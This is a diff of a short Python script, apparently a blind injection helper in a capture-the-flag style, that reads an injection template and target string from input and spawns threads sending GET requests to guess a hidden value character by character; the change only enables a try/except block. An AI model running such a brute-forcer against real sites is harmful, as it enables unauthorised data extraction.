@@ -10,7 +10,7 @@ data=input("输入注入语句")
 find=input("需要查找的字符串")
 # data='?c=11{}{}123'
 def fun(url,result,result2):
-    # 
+    try:
         for i in range(result2):
             print(i)
             reponse=requests.get(url+data.format(result,i))
@@ -18,8 +18,8 @@ def fun(url,result,result2):
                 print(result,chr(i)+"\n")
                 break
         return
-    # except:
-    #     pass
+    except:
+        pass
 for  i in range(result):
     t=threading.Thread(target=fun,args=(url,i,150))
     t.start()
